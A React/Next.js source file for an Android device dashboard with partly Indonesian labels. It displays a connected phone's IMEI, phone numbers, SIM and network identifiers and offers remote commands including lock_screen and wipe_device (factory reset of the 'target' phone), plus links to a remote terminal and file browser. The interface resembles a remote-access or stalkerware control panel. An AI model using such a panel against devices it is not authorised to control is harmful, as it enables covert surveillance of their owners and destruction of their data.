'use client'
import { useEffect, useState } from 'react'
import useSWR from 'swr'
import Sidebar from '@/components/Sidebar'
import StatCard from '@/components/StatCard'
import { useDevice } from '@/contexts/DeviceContext'
import {
  Battery, BatteryCharging, HardDrive, Wifi,
  Clock, Smartphone, Bell, BellOff,
  CreditCard, Signal, Lock, Trash2, Terminal, FolderOpen, Settings,
} from 'lucide-react'
import { Server } from 'lucide-react'

interface DeviceListItem {
  deviceId: string
  deviceName: string
  connected: boolean
  lastSeen: string | null
  model: string
  androidVersion: string
  battery: string
  batteryStatus: string
  ip: string
}

interface DeviceStats {
  connected: boolean
  lastSeen: string | null
  battery: string
  batteryStatus: string
  model: string
  androidVersion: string
  ip: string
  storage: string
  storageFree: string
  networkType: string
  cpuUsage: string
  memTotal: string
  memFree: string
  uptime: string
  hostname: string
  kernel: string
  screenState: string
  brand?: string
  device?: string
  // compat fields (SIM 1 data)
  imei?: string
  phoneNumber?: string
  simOperator?: string
  simCountry?: string
  simSerial?: string
  simSlots?: string
  simState?: string
  networkOperator?: string
  networkGeneration?: string
  roaming?: string
  mccMnc?: string
  // dual SIM per-card data
  sims?: SimCardInfo[]
}

interface SimCardInfo {
  slot: string
  number: string
  operator: string
  country: string
  imei: string
  state: string
  mccMnc: string
}

interface DeviceEntry {
  deviceId: string
  deviceName: string
  connected: boolean
  lastSeen: string | null
  stats: DeviceStats
}

export default function Dashboard() {
  const { devices, selectedId, setSelectedId } = useDevice()
  const [device, setDevice] = useState<DeviceEntry | null>(null)
  const [loading, setLoading] = useState(true)
  const [isRinging, setIsRinging] = useState(false)
  const [ctrlBusy, setCtrlBusy]         = useState(false)
  const [showWipeConfirm, setShowWipeConfirm] = useState(false)

  const swrKey = selectedId ? `/api/device/heartbeat?deviceId=${encodeURIComponent(selectedId)}` : null
  const { data: deviceData, isLoading: swrLoading } = useSWR(
    swrKey,
    (url: string) => fetch(url).then(r => r.json()),
    {
      refreshInterval: 3000,
      keepPreviousData: true,
      revalidateOnFocus: true,
      dedupingInterval: 1500,
      onSuccess: (data) => {
        if (data?.device) {
          setDevice(data.device)
          setLoading(false)
        }
      }
    }
  )

  useEffect(() => {
    if (!selectedId) { setLoading(false); return }
    setLoading(true)
    if (deviceData?.device) { setDevice(deviceData.device); setLoading(false) }
  }, [selectedId, deviceData])

  const sendControl = async (command: string) => {
    if (!selectedId || ctrlBusy) return
    setCtrlBusy(true)
    try {
      await fetch('/api/device/command', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ deviceId: selectedId, command }),
      })
    } finally {
      setCtrlBusy(false)
    }
  }

  const pollResult = async (command: string, sentAt: number, timeoutMs = 18000): Promise<string> => {
    const deadline = Date.now() + timeoutMs
    await new Promise(r => setTimeout(r, 2000))
    while (Date.now() < deadline) {
      try {
        const res = await fetch(`/api/device/result?deviceId=${selectedId}`)
        const d = await res.json()
        const match = (d.history ?? [])
          .filter((h: { command: string; result: string; timestamp: string }) =>
            h.command === command && new Date(h.timestamp).getTime() > sentAt - 500)
          .sort((a: { timestamp: string }, b: { timestamp: string }) =>
            new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime())[0]
        if (match?.result) return match.result as string
      } catch {}
      await new Promise(r => setTimeout(r, 1500))
    }
    return ''
  }

  const handleRingToggle = async () => {
    const cmd = isRinging ? 'stop_ring' : 'ring_device'
    await sendControl(cmd)
    setIsRinging(r => !r)
  }

  const connected = device ? device.connected : false
  const stats = device?.stats
  const hasData = !!device && (stats?.battery !== '--' || stats?.model !== 'Unknown Device')
  const lastSeenMs = device?.lastSeen ? Date.now() - new Date(device.lastSeen).getTime() : null
  const lastSeenLabel = lastSeenMs == null ? null
    : lastSeenMs < 90000   ? null
    : lastSeenMs < 3600000 ? `${Math.round(lastSeenMs / 60000)}m ago`
    : `${Math.round(lastSeenMs / 3600000)}h ago`
  const battPct = parseInt(stats?.battery ?? '0') || 0
  const battColor = battPct > 50 ? 'green' : battPct > 20 ? 'yellow' : 'red'
  const isCharging = stats?.batteryStatus === 'Charging'
  const memFreeNum = parseFloat(stats?.memFree ?? '0') || 0
  const memTotalNum = parseFloat(stats?.memTotal ?? '1') || 1
  const memUsedPct = Math.round((1 - memFreeNum / memTotalNum) * 100)
  const storageUsed = parseFloat(stats?.storage ?? '0') || 0
  const storageFree = parseFloat(stats?.storageFree ?? '0') || 0
  const storageTotal = storageUsed + storageFree
  const storageUsedPct = storageTotal ? Math.round((storageUsed / storageTotal) * 100) : 0

  return (
    <div className="flex min-h-screen">
      <Sidebar connected={connected} devices={devices} selectedId={selectedId} onSelect={setSelectedId} />

      <main className="flex-1 page-content overflow-y-auto">
        <div className="max-w-5xl mx-auto px-4 md:px-6 py-4 md:py-6">

          {/* Header */}
          <div className="mb-4">
            <h2 className="text-lg md:text-xl font-bold text-white">Device Dashboard</h2>
            <p className="text-android-muted text-xs md:text-sm mt-0.5">
              {connected
                ? `Connected · sync otomatis · ${device?.lastSeen ? new Date(device.lastSeen).toLocaleTimeString() : '--'}`
                : hasData && lastSeenLabel
                ? <span className="text-android-yellow">Offline · last seen {lastSeenLabel}</span>
                : devices.length > 0 ? 'Pilih device di navigasi' : 'Menunggu device…'}
            </p>
          </div>

          {/* No device banner */}
          {!connected && !loading && devices.length === 0 && (
            <div className="mb-4 p-4 bg-android-yellow/10 border border-android-yellow/30 rounded-xl flex items-start gap-3">
              <Smartphone size={16} className="text-android-yellow mt-0.5 shrink-0" />
              <div>
                <p className="text-android-yellow text-sm font-medium">No device connected</p>
                <p className="text-android-muted text-xs mt-0.5">
                  Install the APK on your Android device. It will auto-connect to this dashboard.
                </p>
              </div>
            </div>
          )}

          {/* Stat cards */}
          <div className="grid grid-cols-3 gap-2 md:gap-3 mb-4">
            <StatCard
              label="Battery"
              value={hasData ? `${stats?.battery ?? '--'}%` : '--'}
              sub={isCharging ? 'Charging' : hasData ? (connected ? 'Discharging' : 'Last known') : 'No device'}
              icon={isCharging ? <BatteryCharging size={17} /> : <Battery size={17} />}
              color={hasData ? battColor : 'default'}
              bar={hasData ? battPct : undefined}
            />
            <StatCard
              label="RAM Free"
              value={hasData ? (stats?.memFree ?? '--') : '--'}
              sub={hasData ? `of ${stats?.memTotal ?? '--'}` : 'No device'}
              icon={<Server size={17} />}
              color="yellow"
              bar={hasData ? memUsedPct : undefined}
            />
            <StatCard
              label="Storage"
              value={hasData ? (stats?.storageFree ?? '--') : '--'}
              sub={hasData ? `free of ${storageTotal ? storageTotal.toFixed(1) + ' GB' : '--'}` : 'No device'}
              icon={<HardDrive size={17} />}
              color="green"
              bar={hasData ? storageUsedPct : undefined}
            />
          </div>

          {/* Info cards */}
          <div className="grid grid-cols-1 md:grid-cols-2 gap-3 mb-3">
            <div className="bg-android-surface border border-android-border rounded-xl p-4">
              <h3 className="text-xs font-semibold text-android-muted uppercase tracking-wider mb-3 flex items-center gap-2">
                <Smartphone size={13} /> Device Info
              </h3>
              <div className="space-y-2.5">
                {[
                  { label: 'Model', value: stats?.model },
                  { label: 'Android', value: stats?.androidVersion },
                  { label: 'Hostname', value: stats?.hostname },
                  { label: 'Kernel', value: stats?.kernel },
                  { label: 'Screen', value: stats?.screenState },
                ].map(({ label, value }) => (
                  <div key={label} className="flex justify-between items-center py-0.5 border-b border-android-border/50 last:border-0">
                    <span className="text-android-muted text-xs">{label}</span>
                    <span className="text-android-text text-xs font-medium font-mono truncate max-w-[160px] md:max-w-[200px]">
                      {hasData ? (value || '--') : '--'}
                    </span>
                  </div>
                ))}
              </div>
            </div>

            <div className="bg-android-surface border border-android-border rounded-xl p-4">
              <h3 className="text-xs font-semibold text-android-muted uppercase tracking-wider mb-3 flex items-center gap-2">
                <Wifi size={13} /> Network & System
              </h3>
              <div className="space-y-2.5">
                {[
                  { label: 'IP Address', value: stats?.ip },
                  { label: 'Network', value: stats?.networkType },
                  { label: 'Uptime', value: stats?.uptime },
                  { label: 'Storage Used', value: hasData ? `${storageUsedPct}%` : '--' },
                  { label: 'RAM Used', value: hasData ? `${memUsedPct}%` : '--' },
                ].map(({ label, value }) => (
                  <div key={label} className="flex justify-between items-center py-0.5 border-b border-android-border/50 last:border-0">
                    <span className="text-android-muted text-xs">{label}</span>
                    <span className="text-android-text text-xs font-medium font-mono truncate max-w-[160px] md:max-w-[200px]">
                      {hasData ? (value || '--') : '--'}
                    </span>
                  </div>
                ))}
              </div>
            </div>
          </div>

          {/* SIM & Identitas Perangkat */}
          <div className="grid grid-cols-1 md:grid-cols-2 gap-3 mb-3">
            <div className="bg-android-surface border border-android-border rounded-xl p-4">
              <h3 className="text-xs font-semibold text-android-muted uppercase tracking-wider mb-3 flex items-center gap-2">
                <CreditCard size={13} /> SIM Card & Telepon
                {hasData && stats?.simSlots && (
                  <span className="ml-auto text-android-blue font-mono normal-case">{stats.simSlots}</span>
                )}
              </h3>

              {/* Dual SIM cards */}
              {hasData && stats?.sims && stats.sims.length > 0 ? (
                <div className="space-y-3">
                  {stats.sims.map((sim, i) => (
                    <div key={i} className="bg-android-bg border border-android-border rounded-lg p-3">
                      <div className="flex items-center gap-2 mb-2">
                        <div className="w-5 h-5 rounded-full bg-android-blue/20 flex items-center justify-center">
                          <span className="text-[9px] font-bold text-android-blue">{i + 1}</span>
                        </div>
                        <span className="text-xs font-semibold text-android-blue">{sim.slot}</span>
                        <span className="ml-auto text-[10px] text-android-muted">{sim.state}</span>
                      </div>
                      <div className="space-y-1.5">
                        {[
                          { label: 'Nomor HP', value: sim.number, color: 'text-android-green' },
                          { label: 'Operator', value: sim.operator, color: 'text-android-text' },
                          { label: 'Negara', value: sim.country, color: 'text-android-text' },
                          { label: 'MCC-MNC', value: sim.mccMnc, color: 'text-android-text' },
                          ...(sim.imei && sim.imei !== '--' ? [{ label: 'IMEI', value: sim.imei, color: 'text-android-yellow' }] : []),
                        ].map(({ label, value, color }) => (
                          <div key={label} className="flex justify-between items-center">
                            <span className="text-android-muted text-[11px]">{label}</span>
                            <span className={`text-[11px] font-medium font-mono truncate max-w-[160px] ${color}`}>{value || '--'}</span>
                          </div>
                        ))}
                      </div>
                    </div>
                  ))}
                </div>
              ) : (
                /* Fallback ke compat fields jika sims belum tersedia */
                <div className="space-y-2.5">
                  {[
                    { label: 'IMEI', value: stats?.imei, color: 'text-android-yellow' },
                    { label: 'Nomor HP', value: stats?.phoneNumber, color: 'text-android-text' },
                    { label: 'Operator SIM', value: stats?.simOperator, color: 'text-android-text' },
                    { label: 'Negara SIM', value: stats?.simCountry, color: 'text-android-text' },
                    { label: 'Status SIM', value: stats?.simState, color: 'text-android-text' },
                  ].map(({ label, value, color }) => (
                    <div key={label} className="flex justify-between items-center py-0.5 border-b border-android-border/50 last:border-0">
                      <span className="text-android-muted text-xs">{label}</span>
                      <span className={`text-xs font-medium font-mono truncate max-w-[180px] ${color}`}>
                        {hasData ? (value || '--') : '--'}
                      </span>
                    </div>
                  ))}
                </div>
              )}
            </div>

            <div className="bg-android-surface border border-android-border rounded-xl p-4">
              <h3 className="text-xs font-semibold text-android-muted uppercase tracking-wider mb-3 flex items-center gap-2">
                <Signal size={13} /> Info Jaringan Lengkap
              </h3>
              <div className="space-y-2.5">
                {[
                  { label: 'Koneksi', value: stats?.networkType },
                  { label: 'Generasi', value: stats?.networkGeneration },
                  { label: 'Operator Jaringan', value: stats?.networkOperator },
                  { label: 'MCC-MNC', value: stats?.mccMnc },
                  { label: 'Roaming', value: stats?.roaming },
                  { label: 'IP Address', value: stats?.ip },
                  { label: 'Uptime', value: stats?.uptime },
                ].map(({ label, value }) => (
                  <div key={label} className="flex justify-between items-center py-0.5 border-b border-android-border/50 last:border-0">
                    <span className="text-android-muted text-xs">{label}</span>
                    <span className={`text-xs font-medium font-mono truncate max-w-[180px] ${
                      label === 'Generasi' ? 'text-android-green' :
                      label === 'Roaming' && value === 'Ya' ? 'text-android-red' : 'text-android-text'
                    }`}>
                      {hasData ? (value || '--') : '--'}
                    </span>
                  </div>
                ))}
              </div>
            </div>
          </div>

          {/* Device Control — Ring */}
          <div className="bg-android-surface border border-android-border rounded-xl p-4 mb-3">
            <h3 className="text-xs font-semibold text-android-muted uppercase tracking-wider mb-3 flex items-center gap-2">
              <Bell size={13} /> Device Control
            </h3>
            {!connected ? (
              <p className="text-android-muted text-xs py-2 text-center">Device must be connected to use these controls</p>
            ) : (
              <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">

                {/* Ring */}
                <div className="bg-android-bg border border-android-border rounded-xl p-4 flex flex-col gap-3">
                  <div className="flex items-start gap-3">
                    <div className={`p-2 rounded-lg ${isRinging ? 'bg-android-yellow/10' : 'bg-android-surface'}`}>
                      {isRinging ? <Bell size={18} className="text-android-yellow" /> : <BellOff size={18} className="text-android-muted" />}
                    </div>
                    <div>
                      <p className="text-sm font-semibold text-android-text">
                        {isRinging ? 'Ringing Now' : 'Ring Device'}
                      </p>
                      <p className="text-xs text-android-muted mt-0.5">
                        {isRinging
                          ? 'Device is ringing at max volume.'
                          : 'Trigger ring at max volume to locate device.'}
                      </p>
                    </div>
                  </div>
                  <button
                    onClick={handleRingToggle}
                    disabled={ctrlBusy}
                    className={`w-full py-2 rounded-lg text-sm font-semibold transition-colors disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center gap-2 ${
                      isRinging
                        ? 'bg-android-red/10 border border-android-red/30 text-android-red hover:bg-android-red/20'
                        : 'bg-android-yellow/10 border border-android-yellow/30 text-android-yellow hover:bg-android-yellow/20'
                    }`}
                  >
                    {ctrlBusy ? '…' : isRinging ? <><BellOff size={14} />Stop Ring</> : <><Bell size={14} />Ring Device</>}
                  </button>
                </div>

              </div>
            )}
          </div>

          {/* ── KONTROL JARAK JAUH ────────────────────────────────────────── */}
          <div className="bg-android-surface border border-android-border rounded-xl p-4 mb-3">
            <h3 className="text-xs font-semibold text-android-muted uppercase tracking-wider mb-3 flex items-center gap-2">
              <Lock size={13} /> Kontrol Jarak Jauh
            </h3>
            {!connected ? (
              <p className="text-android-muted text-xs py-2 text-center">Hubungkan perangkat untuk menggunakan kontrol ini</p>
            ) : (
              <div className="grid grid-cols-2 sm:grid-cols-3 gap-2.5">

                {/* Lock Screen */}
                <button
                  onClick={() => sendControl('lock_screen')}
                  disabled={ctrlBusy}
                  className="flex flex-col items-center gap-2 p-3.5 bg-android-bg border border-android-border rounded-xl hover:border-blue-500/50 hover:bg-blue-500/5 transition-colors disabled:opacity-50 group"
                >
                  <div className="p-2 rounded-lg bg-blue-500/10 group-hover:bg-blue-500/20 transition-colors">
                    <Lock size={18} className="text-blue-400" />
                  </div>
                  <span className="text-xs font-medium text-android-text">Kunci Layar</span>
                </button>

                {/* Wipe Device */}
                <button
                  onClick={() => setShowWipeConfirm(true)}
                  disabled={ctrlBusy}
                  className="flex flex-col items-center gap-2 p-3.5 bg-android-bg border border-android-red/30 rounded-xl hover:bg-android-red/10 transition-colors disabled:opacity-50 group"
                >
                  <div className="p-2 rounded-lg bg-android-red/10 group-hover:bg-android-red/20 transition-colors">
                    <Trash2 size={18} className="text-android-red" />
                  </div>
                  <span className="text-xs font-medium text-android-red">Wipe Device</span>
                  <span className="text-xs text-android-muted text-center">Factory reset</span>
                </button>

              </div>
            )}
          </div>

          {/* ── WIPE CONFIRM MODAL ────────────────────────────────────────────── */}
          {showWipeConfirm && (
            <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/70 px-4">
              <div className="w-full max-w-sm bg-android-surface border border-android-red/40 rounded-2xl p-5 space-y-4">
                <div className="flex items-center gap-3">
                  <div className="p-2.5 rounded-xl bg-android-red/10">
                    <Trash2 size={22} className="text-android-red" />
                  </div>
                  <div>
                    <h3 className="text-sm font-bold text-android-red">Wipe Device?</h3>
                    <p className="text-xs text-android-muted mt-0.5">Tindakan ini tidak bisa dibatalkan!</p>
                  </div>
                </div>
                <p className="text-xs text-android-muted bg-android-bg border border-android-red/20 rounded-lg p-3">
                  Semua data, aplikasi, dan file di HP target akan <strong className="text-android-red">DIHAPUS PERMANEN</strong>. HP akan kembali ke setelan pabrik. Pastikan Device Admin sudah aktif.
                </p>
                <div className="flex gap-2">
                  <button onClick={() => setShowWipeConfirm(false)} className="flex-1 py-2.5 rounded-lg text-xs font-semibold border border-android-border text-android-muted hover:text-white transition-colors">Batal</button>
                  <button
                    onClick={() => { sendControl('wipe_device'); setShowWipeConfirm(false) }}
                    disabled={ctrlBusy}
                    className="flex-1 py-2.5 rounded-lg text-xs font-semibold bg-android-red/10 border border-android-red/50 text-android-red hover:bg-android-red/20 transition-colors disabled:opacity-50"
                  >
                    {ctrlBusy ? '…' : <span className="flex items-center justify-center gap-1.5"><Trash2 size={13} />Ya, Wipe!</span>}
                  </button>
                </div>
              </div>
            </div>
          )}

          {/* Quick actions */}
          <div className="bg-android-surface border border-android-border rounded-xl p-4">
            <h3 className="text-xs font-semibold text-android-muted uppercase tracking-wider mb-3 flex items-center gap-2">
              <Clock size={13} /> Quick Actions
            </h3>
            <div className="grid grid-cols-3 gap-2">
              {[
                { label: 'Terminal', icon: <Terminal size={15} />, href: `/terminal${selectedId ? `?d=${selectedId}` : ''}` },
                { label: 'Files', icon: <FolderOpen size={15} />, href: `/files${selectedId ? `?d=${selectedId}` : ''}` },
                { label: 'Setup', icon: <Settings size={15} />, href: '/setup' },
              ].map(({ label, icon, href }) => (
                <a
                  key={label}
                  href={href}
                  className="flex items-center justify-center gap-2 px-3 py-2.5 bg-android-bg border border-android-border rounded-lg text-xs text-android-text hover:border-android-green hover:text-android-green transition-colors text-center"
                >
                  {icon}
                  {label}
                </a>
              ))}
            </div>
          </div>

        </div>
      </main>
    </div>
  )
}
